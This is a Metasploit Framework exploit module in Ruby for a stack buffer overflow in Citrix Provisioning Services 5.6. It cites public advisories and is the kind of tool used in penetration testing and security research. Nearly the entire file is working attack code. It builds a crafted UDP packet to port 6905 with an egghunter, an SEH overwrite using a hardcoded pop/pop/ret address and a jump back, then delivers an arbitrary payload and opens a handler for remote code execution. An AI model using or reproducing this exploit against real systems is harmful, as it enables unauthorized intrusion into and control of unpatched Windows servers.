##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Udp
	include Msf::Exploit::Remote::Egghunter

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Citrix Provisioning Services 5.6 streamprocess.exe Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Citrix Provisioning Services 5.6.
				By sending a specially crafted packet to the Provisioning Services server, a fixed
				length buffer on the stack can be overflowed and arbitrary code can be executed.
			},
			'Author'         => 'mog',
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'OSVDB', '70597'],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-023/' ],
					[ 'URL', 'http://secunia.com/advisories/42954/' ],
					[ 'URL', 'http://support.citrix.com/article/CTX127149' ],
				],
			'DefaultOptions' =>
				{
					# best at delaying/preventing target crashing post-exploit
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'BadChars' => "\x00", # Only "\x00\x00" breaks the overflow, but this is safer
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# pop/pop/ret in streamprocess.exe
					# Service runs and automatically shuts down in Win 7
					[ 'Windows XP SP3 / Windows Server 2003 SP2 / Windows Vista', { 'Ret' => 0x00423d32 } ],
				],
			'Privileged'     => true,
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jan 20 2011'))

		register_options([Opt::RPORT(6905)], self.class)
	end

	def exploit

		eggoptions =
		{
			:checksum  => true,
			:eggtag    => 'W00t',
		}
		hunter,egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)

		sploit = "\x10\x00\x02\x40"  # message type
		sploit << rand_text_alpha_upper(30)
		sploit << "\x00\x01\x00\x00" # length field
		sploit << rand_text_alpha_upper(400)
		sploit << hunter
		sploit << rand_text_alpha_upper(64 - hunter.length)

		sploit << "\xEB\xBE"                # Jump back 66 bytes to hunter because there's
		sploit << rand_text_alpha_upper(2)  # only 24 bytes of cyclic copy after ret
		sploit << [target.ret].pack('V')    # SE handler

		sploit << rand_text_alpha_upper(50) # Need >= 24 bytes to keep the tag out of the stack
		sploit << egg                       # Payload has a whole page to itself

		print_status("Trying target #{target.name}...")

		connect_udp
		udp_sock.put(sploit)
		print_status("Exploit sent, wait for egghunter.")
		select(nil, nil, nil, 4) # takes about 8 seconds in tests

		handler(udp_sock)
		disconnect_udp
	end

end
